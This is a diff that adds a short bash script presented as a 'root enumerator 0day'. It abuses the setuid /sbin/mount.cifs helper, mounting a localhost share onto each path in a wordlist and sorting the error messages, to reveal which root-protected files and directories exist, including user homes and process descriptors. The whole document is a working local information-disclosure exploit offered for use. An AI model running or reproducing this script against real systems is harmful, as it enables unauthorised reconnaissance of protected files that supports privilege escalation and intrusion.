@@ -1,0 +1,27 @@
+# !/bin/bash
+#  root enumerator 0day by jesus.olmos@blueliv.com @sha0coder #  discover root protected files & directories, user homes, process descriptors, ...
+
+path=$2
+wordlist=$1
+
+for i in `cat $wordlist`
+do
+
+echo -n "$i:"
+
+/sbin/mount.cifs  //127.0.0.1/a $path/$i
+
+done 2>log.$$ 1>&2
+
+echo --- directories ---
+for i in `grep 'denied' log.$$ | cut -d ':' -f 1` do
+         echo $i
+done
+
+echo --- files ---
+for i in `grep -i 'not a directory' log.$$ | cut -d ':' -f 1` do
+         echo $i
+done
+
+rm log.$$
+
